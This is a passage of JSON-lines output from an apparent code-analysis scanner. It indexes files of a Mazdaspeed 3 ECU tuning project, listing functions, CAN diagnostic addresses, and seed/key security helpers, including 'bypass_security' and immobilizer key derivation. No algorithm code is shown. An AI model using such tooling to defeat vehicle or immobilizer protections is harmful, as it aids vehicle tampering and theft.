"protocol", "line": 108, "protocol": "0x[0-9A-Fa-f]+", "content": "'tcm_address': 0x7E1,"}], "hardware_assumptions": [{"type": "hardware", "line": 3, "hardware": "vehicle", "content": "All vehicle-specific parameters and tuning limits"}, {"type": "hardware", "line": 78, "hardware": "vehicle", "content": "VEHICLE_SPECS = {"}, {"type": "hardware", "line": 90, "hardware": "ECU", "content": "ECU_MEMORY_MAP = {"}, {"type": "hardware", "line": 107, "hardware": "ECU", "content": "'ecu_address': 0x7E0,"}, {"type": "hardware", "line": 108, "hardware": "TCM", "content": "'tcm_address': 0x7E1,"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/core/__init__.py", "lines_read": 6, "features_found": [{"type": "import", "module": ".main", "line": null}, {"type": "import", "module": "Mazdaspeed3Tuner", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/core/main.py", "lines_read": 655, "features_found": [{"type": "function", "name": "__init__", "line": 43}, {"type": "function", "name": "_initialize_system", "line": 85}, {"type": "function", "name": "_initialize_database", "line": 123}, {"type": "function", "name": "_serialize_calibration", "line": 131}, {"type": "function", "name": "_initialize_security_helpers", "line": 140}, {"type": "function", "name": "_connect_to_can_bus", "line": 155}, {"type": "function", "name": "_disconnect_can_bus", "line": 169}, {"type": "function", "name": "_get_live_can_data", "line": 176}, {"type": "function", "name": "_simulate_sensor_data", "line": 183}, {"type": "function", "name": "_build_sensor_data_from_live_data", "line": 212}, {"type": "function", "name": "start_diagnostic_session", "line": 231}, {"type": "function", "name": "stop_diagnostic_session", "line": 238}, {"type": "function", "name": "read_diagnostic_identifier", "line": 243}, {"type": "function", "name": "fetch_dtc_list", "line": 259}, {"type": "function", "name": "derive_security_key", "line": 269}, {"type": "function", "name": "start_real_time_tuning", "line": 284}, {"type": "function", "name": "stop_real_time_tuning", "line": 305}, {"type": "function", "name": "_data_acquisition_loop", "line": 318}, {"type": "function", "name": "_read_sensor_data", "line": 344}, {"type": "function", "name": "_log_sensor_data", "line": 355}, {"type": "function", "name": "_process_sensor_data", "line": 360}, {"type": "function", "name": "_tuning_optimization_loop", "line": 397}, {"type": "function", "name": "_apply_tuning_secrets", "line": 453}, {"type": "function", "name": "_combine_tuning_adjustments", "line": 489}, {"type": "function", "name": "_apply_safety_limits", "line": 525}, {"type": "function", "name": "_apply_tuning_parameters", "line": 569}, {"type": "function", "name": "_update_system_status", "line": 592}, {"type": "function", "name": "get_system_status", "line": 609}, {"type": "function", "name": "set_performance_mode", "line": 618}, {"type": "function", "name": "execute_dealer_command", "line": 627}, {"type": "function", "name": "clear_adaptations", "line": 637}, {"type": "function", "name": "save_ai_models", "line": 647}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "diagnostic_module", "line": null}, {"type": "import", "module": "muts.comms.can_interface", "line": null}, {"type": "import", "module": "muts.database", "line": null}, {"type": "import", "module": "muts.security", "line": null}, {"type": "import", "module": "muts.services.ai_tuner", "line": null}, {"type": "import", "module": "muts.services.dealer_service", "line": null}, {"type": "import", "module": "muts.services.performance_features", "line": null}, {"type": "import", "module": "muts.services.physics_engine", "line": null}, {"type": "import", "module": "muts.models.turbo_models", "line": null}, {"type": "import", "module": "muts.utils.calculations", "line": null}, {"type": "import", "module": "muts.utils.security", "line": null}, {"type": "import", "module": "muts.config.mazdaspeed3_config", "line": null}, {"type": "import", "module": "time", "line": null}, {"type": "import", "module": "threading", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "DiagnosticMessage,", "line": null}, {"type": "import", "module": "Mazdaspeed3CANInterface", "line": null}, {"type": "import", "module": "Mazdaspeed3Database", "line": null}, {"type": "import", "module": "MazdaECUType,", "line": null}, {"type": "import", "module": "AITuningSystem", "line": null}, {"type": "import", "module": "MazdaDealerSecurity", "line": null}, {"type": "import", "module": "AdvancedPerformanceManager", "line": null}, {"type": "import", "module": "TurbochargerPhysics,", "line": null}, {"type": "import", "module": "TurboSystemManager", "line": null}, {"type": "import", "module": "AdvancedCalculations,", "line": null}, {"type": "import", "module": "SecurityManager", "line": null}, {"type": "import", "module": "*", "line": null}], "components_found": [{"type": "class", "name": "Mazdaspeed3Tuner", "line": 37}], "algorithms": [{"type": "algorithm_function", "line": 269, "content": "def derive_security_key(self, seed: bytes, security_level: int = 1) -> Optional[bytes]:"}], "protocols": [{"type": "protocol", "line": 13, "protocol": "CAN", "content": "from muts.comms.can_interface import Mazdaspeed3CANInterface"}, {"type": "protocol", "line": 52, "protocol": "CAN", "content": "self.can_interface = Mazdaspeed3CANInterface()"}, {"type": "protocol", "line": 156, "protocol": "CAN", "content": "\"\"\"Attempt to connect to the CAN bus and start live data streaming.\"\"\""}, {"type": "protocol", "line": 161, "protocol": "CAN", "content": "logger.info(\"CAN interface connected and receiving data\")"}, {"type": "protocol", "line": 164, "protocol": "CAN", "content": "logger.warning(f\"CAN bus connection unavailable: {exc}\")"}, {"type": "protocol", "line": 170, "protocol": "CAN", "content": "\"\"\"Disconnect from the CAN interface cleanly.\"\"\""}, {"type": "protocol", "line": 174, "protocol": "CAN", "content": "logger.info(\"CAN interface disconnected\")"}, {"type": "protocol", "line": 177, "protocol": "CAN", "content": "\"\"\"Fetch the latest live CAN data snapshot.\"\"\""}, {"type": "protocol", "line": 184, "protocol": "CAN", "content": "\"\"\"Return simulator sensor data when live CAN data is unavailable.\"\"\""}, {"type": "protocol", "line": 213, "protocol": "CAN", "content": "\"\"\"Merge live CAN readings into the tuning sensor template.\"\"\""}, {"type": "protocol", "line": 251, "protocol": "0x[0-9A-Fa-f]+", "content": "source_address=0x7DF,"}, {"type": "protocol", "line": 252, "protocol": "0x[0-9A-Fa-f]+", "content": "service_id=0x22,"}, {"type": "protocol", "line": 253, "protocol": "0x[0-9A-Fa-f]+", "content": "sub_function=0x00,"}, {"type": "protocol", "line": 260, "protocol": "CAN", "content": "\"\"\"Read current diagnostic trouble codes via the CAN interface.\"\"\""}, {"type": "protocol", "line": 347, "protocol": "CAN", "content": "In real implementation, this would interface with CAN bus and OBD-II"}, {"type": "protocol", "line": 347, "protocol": "OBD", "content": "In real implementation, this would interface with CAN bus and OBD-II"}], "hardware_assumptions": [{"type": "hardware", "line": 15, "hardware": "ECU", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "from muts.services.dealer_service import MazdaDealerSecurity"}, {"type": "hardware", "line": 22, "hardware": "ECU", "content": "from muts.utils.security import SecurityManager"}, {"type": "hardware", "line": 49, "hardware": "vehicle", "content": "self.vehicle_vin = \"JM1BK123456789012\""}, {"type": "hardware", "line": 50, "hardware": "ECU", "content": "self.security_manager = SecurityManager()"}, {"type": "hardware", "line": 56, "hardware": "ECU", "content": "self.dealer_security = MazdaDealerSecurity()"}, {"type": "hardware", "line": 91, "hardware": "ECU", "content": "self._initialize_security_helpers()"}, {"type": "hardware", "line": 99, "hardware": "ECU", "content": "security_status = self.dealer_security.perform_security_access('ecu')"}, {"type": "hardware", "line": 100, "hardware": "ECU", "content": "logger.info(f\"Dealer security access: {security_status}\")"}, {"type": "hardware", "line": 109, "hardware": "ECU", "content": "'security_access': True,"}, {"type": "hardware", "line": 132, "hardware": "ECU", "content": "\"\"\"Serialize calibration record to a simple dictionary for logging/security.\"\"\""}, {"type": "hardware", "line": 135, "hardware": "vehicle", "content": "'vehicle_model': calibration.vehicle_model,"}, {"type": "hardware", "line": 136, "hardware": "ECU", "content": "'ecu_hardware': calibration.ecu_hardware,"}, {"type": "hardware", "line": 140, "hardware": "ECU", "content": "def _initialize_security_helpers(self):"}, {"type": "hardware", "line": 141, "hardware": "vehicle", "content": "\"\"\"Encrypt factory calibration data and generate vehicle signature.\"\"\""}, {"type": "hardware", "line": 147, "hardware": "ECU", "content": "self.encrypted_calibration_data = self.security_manager.encrypt_calibration_data(payload)"}, {"type": "hardware", "line": 148, "hardware": "ECU", "content": "self.calibration_signature = self.security_manager.generate_vehicle_signature("}, {"type": "hardware", "line": 148, "hardware": "vehicle", "content": "self.calibration_signature = self.security_manager.generate_vehicle_signature("}, {"type": "hardware", "line": 149, "hardware": "vehicle", "content": "self.vehicle_vin, payload['calibration_id']"}, {"type": "hardware", "line": 151, "hardware": "ECU", "content": "logger.info(\"Security payloads initialized for calibration data\")"}, {"type": "hardware", "line": 153, "hardware": "ECU", "content": "logger.warning(f\"Failed to initialize security helpers: {exc}\")"}, {"type": "hardware", "line": 156, "hardware": "CAN bus", "content": "\"\"\"Attempt to connect to the CAN bus and start live data streaming.\"\"\""}, {"type": "hardware", "line": 164, "hardware": "CAN bus", "content": "logger.warning(f\"CAN bus connection unavailable: {exc}\")"}, {"type": "hardware", "line": 188, "hardware": "vehicle", "content": "'vehicle_speed': 45.2,"}, {"type": "hardware", "line": 232, "hardware": "vehicle", "content": "\"\"\"Establish a diagnostic session with the vehicle.\"\"\""}, {"type": "hardware", "line": 233, "hardware": "vehicle", "content": "connected = self.diagnostic_protocol.connect_to_vehicle()"}, {"type": "hardware", "line": 246, "hardware": "vehicle", "content": "if not self.diagnostic_protocol.connect_to_vehicle():"}, {"type": "hardware", "line": 250, "hardware": "ECU", "content": "target_address=self.diagnostic_protocol.ECU_ADDRESSES['ENGINE_ECU'],"}, {"type": "hardware", "line": 269, "hardware": "ECU", "content": "def derive_security_key(self, seed: bytes, security_level: int = 1) -> Optional[bytes]:"}, {"type": "hardware", "line": 270, "hardware": "ECU", "content": "\"\"\"Derive a Mazda security key using the seed/key helper database.\"\"\""}, {"type": "hardware", "line": 271, "hardware": "ECU", "content": "ecu_info = self.seed_key_database.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "hardware", "line": 272, "hardware": "ECU", "content": "if not ecu_info:"}, {"type": "hardware", "line": 275, "hardware": "ECU", "content": "seed_length = ecu_info['seed_length']"}, {"type": "hardware", "line": 280, "hardware": "ECU", "content": "ecu_info['algorithm'],"}, {"type": "hardware", "line": 281, "hardware": "ECU", "content": "security_level=security_level"}, {"type": "hardware", "line": 346, "hardware": "vehicle", "content": "Read current sensor data from vehicle systems"}, {"type": "hardware", "line": 347, "hardware": "CAN bus", "content": "In real implementation, this would interface with CAN bus and OBD-II"}, {"type": "hardware", "line": 570, "hardware": "vehicle", "content": "\"\"\"Apply tuning parameters to vehicle systems\"\"\""}, {"type": "hardware", "line": 627, "hardware": "ECU", "content": "def execute_dealer_command(self, command: str, parameters: dict = None) -> dict:"}, {"type": "hardware", "line": 628, "hardware": "ECU", "content": "\"\"\"Execute dealer-level diagnostic command\"\"\""}, {"type": "hardware", "line": 630, "hardware": "ECU", "content": "result = self.dealer_security.execute_dealer_command(command, parameters)"}, {"type": "hardware", "line": 631, "hardware": "ECU", "content": "logger.info(f\"Dealer command executed: {command}\")"}, {"type": "hardware", "line": 638, "hardware": "ECU", "content": "\"\"\"Clear all ECU adaptations\"\"\""}, {"type": "hardware", "line": 640, "hardware": "ECU", "content": "results = self.dealer_security.clear_all_adaptations()"}, {"type": "hardware", "line": 641, "hardware": "ECU", "content": "logger.info(\"ECU adaptations cleared\")"}], "security_logic": [{"type": "security_pattern", "line": 15, "pattern": "key", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "security_pattern", "line": 15, "pattern": "seed", "content": "from muts.security import MazdaECUType, MazdaSeedKeyDatabase"}, {"type": "security_pattern", "line": 47, "pattern": "encrypt", "content": "self.encrypted_calibration_data = None"}, {"type": "security_pattern", "line": 51, "pattern": "key", "content": "self.seed_key_database = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 51, "pattern": "seed", "content": "self.seed_key_database = MazdaSeedKeyDatabase()"}, {"type": "security_pattern", "line": 99, "pattern": "security_access", "content": "security_status = self.dealer_security.perform_security_access('ecu')"}, {"type": "security_pattern", "line": 109, "pattern": "security_access", "content": "'security_access': True,"}, {"type": "security_pattern", "line": 141, "pattern": "encrypt", "content": "\"\"\"Encrypt factory calibration data and generate vehicle signature.\"\"\""}, {"type": "security_pattern", "line": 147, "pattern": "encrypt", "content": "self.encrypted_calibration_data = self.security_manager.encrypt_calibration_data(payload)"}, {"type": "security_pattern", "line": 269, "pattern": "key", "content": "def derive_security_key(self, seed: bytes, security_level: int = 1) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 269, "pattern": "seed", "content": "def derive_security_key(self, seed: bytes, security_level: int = 1) -> Optional[bytes]:"}, {"type": "security_pattern", "line": 270, "pattern": "key", "content": "\"\"\"Derive a Mazda security key using the seed/key helper database.\"\"\""}, {"type": "security_pattern", "line": 270, "pattern": "seed", "content": "\"\"\"Derive a Mazda security key using the seed/key helper database.\"\"\""}, {"type": "security_pattern", "line": 271, "pattern": "key", "content": "ecu_info = self.seed_key_database.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 271, "pattern": "seed", "content": "ecu_info = self.seed_key_database.ecu_database.get(MazdaECUType.ENGINE_ECU)"}, {"type": "security_pattern", "line": 275, "pattern": "seed", "content": "seed_length = ecu_info['seed_length']"}, {"type": "security_pattern", "line": 276, "pattern": "seed", "content": "truncated_seed = seed[:seed_length].ljust(seed_length, b'\\x00')"}, {"type": "security_pattern", "line": 278, "pattern": "key", "content": "return self.seed_key_database.calculate_key("}, {"type": "security_pattern", "line": 278, "pattern": "seed", "content": "return self.seed_key_database.calculate_key("}, {"type": "security_pattern", "line": 279, "pattern": "seed", "content": "truncated_seed,"}, {"type": "security_pattern", "line": 280, "pattern": "algorithm", "content": "ecu_info['algorithm'],"}, {"type": "security_pattern", "line": 505, "pattern": "key", "content": "for key, value in ai_adjustments.items():"}, {"type": "security_pattern", "line": 506, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 508, "pattern": "key", "content": "combined[key] = 0.6 * combined[key] + 0.4 * value"}, {"type": "security_pattern", "line": 510, "pattern": "key", "content": "combined[key] = value * 0.6  # Reduced weight for AI-only adjustments"}, {"type": "security_pattern", "line": 513, "pattern": "key", "content": "for key, value in secret_adjustments.items():"}, {"type": "security_pattern", "line": 514, "pattern": "key", "content": "if key in combined:"}, {"type": "security_pattern", "line": 516, "pattern": "key", "content": "if 'spool' in key or 'boost' in key:"}, {"type": "security_pattern", "line": 517, "pattern": "key", "content": "combined[key] = 0.3 * combined[key] + 0.7 * value"}, {"type": "security_pattern", "line": 519, "pattern": "key", "content": "combined[key] = 0.5 * combined[key] + 0.5 * value"}, {"type": "security_pattern", "line": 521, "pattern": "key", "content": "combined[key] = value"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/database/__init__.py", "lines_read": 7, "features_found": [{"type": "import", "module": ".ecu_database", "line": null}, {"type": "import", "module": ".tuning_database", "line": null}, {"type": "import", "module": "Mazdaspeed3Database,", "line": null}, {"type": "import", "module": "PerformanceTuningMap,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 5, "hardware": "ECU", "content": "from .ecu_database import Mazdaspeed3Database, FactoryCalibration"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/database/ecu_database.py", "lines_read": 146, "features_found": [{"type": "function", "name": "get_ignition_map", "line": 56}, {"type": "function", "name": "get_fuel_map", "line": 63}, {"type": "function", "name": "__init__", "line": 70}, {"type": "function", "name": "_initialize_factory_data", "line": 80}, {"type": "function", "name": "get_factory_calibration", "line": 139}, {"type": "import", "module": "sqlalchemy.ext.declarative", "line": null}, {"type": "import", "module": "sqlalchemy.orm", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "declarative_base", "line": null}, {"type": "import", "module": "sessionmaker", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "ECUCalibration", "line": 16}, {"type": "class", "name": "Mazdaspeed3Database", "line": 67}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "COMPLETE MAZDASPEED 3 ECU DATABASE"}, {"type": "hardware", "line": 16, "hardware": "ECU", "content": "class ECUCalibration(Base):"}, {"type": "hardware", "line": 17, "hardware": "ECU", "content": "\"\"\"Factory ECU calibration database for MZR 2.3L DISI Turbo\"\"\""}, {"type": "hardware", "line": 18, "hardware": "ECU", "content": "__tablename__ = 'ecu_calibrations'"}, {"type": "hardware", "line": 23, "hardware": "vehicle", "content": "vehicle_model = sa.Column(sa.String(20))  # 'MAZDASPEED3_2011'"}, {"type": "hardware", "line": 24, "hardware": "ECU", "content": "ecu_hardware = sa.Column(sa.String(30))   # 'MZR_DISI_L3K9'"}, {"type": "hardware", "line": 77, "hardware": "ECU", "content": "if not self.session.query(ECUCalibration).first():"}, {"type": "hardware", "line": 126, "hardware": "ECU", "content": "factory_cal = ECUCalibration("}, {"type": "hardware", "line": 129, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\","}, {"type": "hardware", "line": 130, "hardware": "ECU", "content": "ecu_hardware=\"MZR_DISI_L3K9\","}, {"type": "hardware", "line": 141, "hardware": "ECU", "content": "return self.session.query(ECUCalibration).filter_by("}, {"type": "hardware", "line": 142, "hardware": "vehicle", "content": "vehicle_model=\"MAZDASPEED3_2011\""}, {"type": "hardware", "line": 145, "hardware": "ECU", "content": "FactoryCalibration = ECUCalibration"}], "security_logic": [{"type": "security_pattern", "line": 3, "pattern": "algorithm", "content": "Contains all factory calibration data, maps, and proprietary algorithms"}, {"type": "security_pattern", "line": 20, "pattern": "key", "content": "id = sa.Column(sa.Integer, primary_key=True)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/database/tuning_database.py", "lines_read": 163, "features_found": [{"type": "import", "module": "sqlalchemy.ext.declarative", "line": null}, {"type": "import", "module": "sqlalchemy.orm", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "sqlalchemy", "line": null}, {"type": "import", "module": "declarative_base", "line": null}, {"type": "import", "module": "sessionmaker,", "line": null}, {"type": "import", "module": "Column,", "line": null}, {"type": "import", "module": "json", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "datetime", "line": null}, {"type": "import", "module": "Dict,", "line": null}], "components_found": [{"type": "class", "name": "PerformanceTuningMap", "line": 17}, {"type": "class", "name": "TurbochargerDatabase", "line": 45}, {"type": "class", "name": "EngineComponentDatabase", "line": 82}, {"type": "class", "name": "TuningSecret", "line": 113}, {"type": "class", "name": "DiagnosticTroubleCode", "line": 140}], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 24, "hardware": "vehicle", "content": "vehicle_model = Column(String(20), nullable=False)"}, {"type": "hardware", "line": 130, "hardware": "vehicle", "content": "vehicle_specific_notes = Column(Text) # Mazdaspeed 3 specific notes"}], "security_logic": [{"type": "security_pattern", "line": 21, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 49, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 86, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 117, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}, {"type": "security_pattern", "line": 144, "pattern": "key", "content": "id = Column(Integer, primary_key=True)"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts", "tuning"]}
{"file_path": "muts/models/__init__.py", "lines_read": 7, "features_found": [{"type": "import", "module": ".engine_models", "line": null}, {"type": "import", "module": ".turbo_models", "line": null}, {"type": "import", "module": "IdealGasPhysics,", "line": null}, {"type": "import", "module": "K04Turbocharger,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/models/engine_models.py", "lines_read": 359, "features_found": [{"type": "function", "name": "__init__", "line": 14}, {"type": "function", "name": "calculate_ideal_gas_velocity", "line": 25}, {"type": "function", "name": "calculate_mass_flow_rate", "line": 59}, {"type": "function", "name": "__init__", "line": 98}, {"type": "function", "name": "_initialize_turbo_specs", "line": 102}, {"type": "function", "name": "calculate_turbine_power", "line": 123}, {"type": "function", "name": "calculate_compressor_power", "line": 179}, {"type": "function", "name": "_get_compressor_efficiency", "line": 210}, {"type": "function", "name": "__init__", "line": 225}, {"type": "function", "name": "_initialize_engine_specs", "line": 229}, {"type": "function", "name": "_create_detailed_ve_table", "line": 243}, {"type": "function", "name": "calculate_indicated_mean_effective_pressure", "line": 264}, {"type": "function", "name": "_get_volumetric_efficiency", "line": 315}, {"type": "function", "name": "_calculate_timing_efficiency", "line": 348}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.optimize", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "minimize_scalar", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "IdealGasPhysics", "line": 11}, {"type": "class", "name": "TurbochargerDynamics", "line": 95}, {"type": "class", "name": "EngineCycleAnalysis", "line": 222}], "algorithms": [{"type": "algorithm_function", "line": 25, "content": "def calculate_ideal_gas_velocity(self, temperature: float, pressure_ratio: float,"}, {"type": "algorithm_function", "line": 59, "content": "def calculate_mass_flow_rate(self, area: float, upstream_pressure: float,"}, {"type": "algorithm_function", "line": 123, "content": "def calculate_turbine_power(self, turbo_rpm: float, exhaust_mass_flow: float,"}, {"type": "algorithm_function", "line": 179, "content": "def calculate_compressor_power(self, turbo_rpm: float, mass_flow: float,"}, {"type": "algorithm_function", "line": 264, "content": "def calculate_indicated_mean_effective_pressure(self, rpm: float, load: float,"}, {"type": "algorithm_function", "line": 348, "content": "def _calculate_timing_efficiency(self, ignition_timing: float, rpm: float) -> float:"}], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 22, "hardware": "ECU", "content": "self.M_air = 28.97  # g/mol - Air molecular weight"}, {"type": "hardware", "line": 23, "hardware": "ECU", "content": "self.M_exhaust = 29.5  # g/mol - Approximate exhaust molecular weight"}, {"type": "hardware", "line": 160, "hardware": "ABS", "content": "ratio_deviation = abs(velocity_ratio - optimal_ratio) / optimal_ratio"}, {"type": "hardware", "line": 215, "hardware": "ABS", "content": "pr_penalty = abs(pressure_ratio - 2.0) * 0.1"}, {"type": "hardware", "line": 216, "hardware": "ABS", "content": "speed_penalty = abs(corrected_speed - 120000) / 120000 * 0.1"}, {"type": "hardware", "line": 217, "hardware": "ABS", "content": "flow_penalty = abs(mass_flow - 0.12) / 0.12 * 0.05"}, {"type": "hardware", "line": 280, "hardware": "ABS", "content": "P_intake = boost_pressure * 6.89476 + 101.325  # Convert PSI to kPa absolute"}, {"type": "hardware", "line": 353, "hardware": "ABS", "content": "timing_error = abs(ignition_timing - mbt_timing)"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/models/turbo_models.py", "lines_read": 467, "features_found": [{"type": "function", "name": "__init__", "line": 17}, {"type": "function", "name": "_create_k04_compressor_map", "line": 55}, {"type": "function", "name": "_create_compressor_interpolator", "line": 93}, {"type": "function", "name": "_create_k04_turbine_map", "line": 120}, {"type": "function", "name": "calculate_compressor_operation", "line": 160}, {"type": "function", "name": "_calculate_surge_line", "line": 200}, {"type": "function", "name": "_calculate_choke_line", "line": 208}, {"type": "function", "name": "calculate_turbine_efficiency", "line": 216}, {"type": "function", "name": "calculate_turbo_spool_dynamics", "line": 234}, {"type": "function", "name": "calculate_compressor_power_requirement", "line": 275}, {"type": "function", "name": "calculate_turbine_power_output", "line": 300}, {"type": "function", "name": "__init__", "line": 331}, {"type": "function", "name": "calculate_wastegate_control", "line": 347}, {"type": "function", "name": "update_turbo_system", "line": 382}, {"type": "function", "name": "_calculate_compressor_outlet_temp", "line": 451}, {"type": "import", "module": "scipy.integrate", "line": null}, {"type": "import", "module": "scipy.interpolate", "line": null}, {"type": "import", "module": "numpy", "line": null}, {"type": "import", "module": "solve_ivp", "line": null}, {"type": "import", "module": "RegularGridInterpolator", "line": null}, {"type": "import", "module": "math", "line": null}], "components_found": [{"type": "class", "name": "K04Turbocharger", "line": 11}, {"type": "class", "name": "TurboSystemManager", "line": 325}], "algorithms": [{"type": "algorithm_function", "line": 160, "content": "def calculate_compressor_operation(self, corrected_speed: float, pressure_ratio: float):"}, {"type": "algorithm_function", "line": 200, "content": "def _calculate_surge_line(self, corrected_speed: float) -> float:"}, {"type": "algorithm_function", "line": 208, "content": "def _calculate_choke_line(self, corrected_speed: float) -> float:"}, {"type": "algorithm_function", "line": 216, "content": "def calculate_turbine_efficiency(self, velocity_ratio: float, expansion_ratio: float) -> float:"}, {"type": "algorithm_function", "line": 234, "content": "def calculate_turbo_spool_dynamics(self, current_rpm: float, turbine_power: float,"}, {"type": "algorithm_function", "line": 275, "content": "def calculate_compressor_power_requirement(self, mass_flow: float, pressure_ratio: float,"}, {"type": "algorithm_function", "line": 300, "content": "def calculate_turbine_power_output(self, mass_flow: float, inlet_temp: float,"}, {"type": "algorithm_function", "line": 347, "content": "def calculate_wastegate_control(self, current_boost: float, target_boost: float,"}, {"type": "algorithm_function", "line": 451, "content": "def _calculate_compressor_outlet_temp(self, inlet_temp: float, pressure_ratio: float,"}], "protocols": [{"type": "protocol", "line": 351, "protocol": "PID", "content": "Uses PID-like control with RPM and throttle compensation"}], "hardware_assumptions": [{"type": "hardware", "line": 178, "hardware": "ABS", "content": "speed_idx = np.argmin(np.abs(self.compressor_map['corrected_speeds'] - corrected_speed))"}, {"type": "hardware", "line": 179, "hardware": "ABS", "content": "pr_idx = np.argmin(np.abs(self.compressor_map['pressure_ratios'] - pressure_ratio))"}, {"type": "hardware", "line": 227, "hardware": "ABS", "content": "vr_idx = np.argmin(np.abs(self.turbine_map['velocity_ratios'] - velocity_ratio))"}, {"type": "hardware", "line": 228, "hardware": "ABS", "content": "er_idx = np.argmin(np.abs(self.turbine_map['expansion_ratios'] - expansion_ratio))"}, {"type": "hardware", "line": 359, "hardware": "ABS", "content": "if abs(boost_error) < 5.0:  # Only integrate when close to target"}, {"type": "hardware", "line": 395, "hardware": "ABS", "content": "current_absolute_pressure = self.current_boost * 6.89476 + atmospheric_pressure"}, {"type": "hardware", "line": 396, "hardware": "ABS", "content": "pressure_ratio = current_absolute_pressure / atmospheric_pressure"}], "security_logic": [], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts"]}
{"file_path": "muts/security/__init__.py", "lines_read": 8, "features_found": [{"type": "import", "module": ".seed_key", "line": null}, {"type": "import", "module": "MazdaECUType,", "line": null}], "components_found": [], "algorithms": [], "protocols": [], "hardware_assumptions": [{"type": "hardware", "line": 2, "hardware": "ECU", "content": "MUTS security helpers and utilities."}, {"type": "hardware", "line": 5, "hardware": "ECU", "content": "from .seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "hardware", "line": 7, "hardware": "ECU", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "security_logic": [{"type": "security_pattern", "line": 5, "pattern": "key", "content": "from .seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "security_pattern", "line": 5, "pattern": "seed", "content": "from .seed_key import MazdaECUType, MazdaSeedKeyDatabase, bypass_security"}, {"type": "security_pattern", "line": 7, "pattern": "key", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}, {"type": "security_pattern", "line": 7, "pattern": "seed", "content": "__all__ = [\"MazdaECUType\", \"MazdaSeedKeyDatabase\", \"bypass_security\"]"}], "dead_or_disabled_code": [], "risks": [], "group_tags": ["muts", "security"]}
{"file_path": "muts/security/seed_key.py", "lines_read": 161, "features_found": [{"type": "function", "name": "bypass_security", "line": 127}, {"type": "function", "name": "__init__", "line": 31}, {"type": "function", "name": "_initialize_algorithm_database", "line": 35}, {"type": "function", "name": "_initialize_ecu_database", "line": 42}, {"type": "function", "name": "calculate_key", "line": 60}, {"type": "function", "name": "_algorithm_27_standard", "line": 77}, {"type": "function", "name": "_algorithm_engine_ecu_2011", "line": 88}, {"type": "function", "name": "_algorithm_immobilizer_2011", "line": 108}, {"type": "function", "name": "_derive_immobilizer_key", "line": 119}, {"type": "import", "module": "typing", "line": null}, {"type": "import", "module": "enum", "line": null}, {"type": "import", "module": "cryptography.hazmat.primitives.ciphers", "line": null}, {"type": "import", "module": "cryptography.hazmat.backends", "line": null}, {"type": "import", "module": "hashlib", "line": null}, {"type": "import", "module": "logging", "line": null}, {"type": "import", "module": "Dict,", "line": null}, {"type": "import", "module": "IntEnum", "line": null}, {"type": "import", "module": "Cipher,", "line": null}, {"type": "import", "module": "default_backend", "line": null}], "components_found": [{"type": "class", "name": "MazdaECUType", "line": 15}, {"type": "class", "name": "MazdaSeedKeyDatabase", "line": 26}], "algorithms": [{"type": "algorithm_function", "line": 35, "content": "def _initialize_algorithm_database(self) -> Dict[str, Callable]:"}, {"type": "algorithm_function", "line": 60, "content": "def calculate_key(self, seed: bytes, algorithm_name: str,"}, {"type": "algorithm_function", "line": 77, 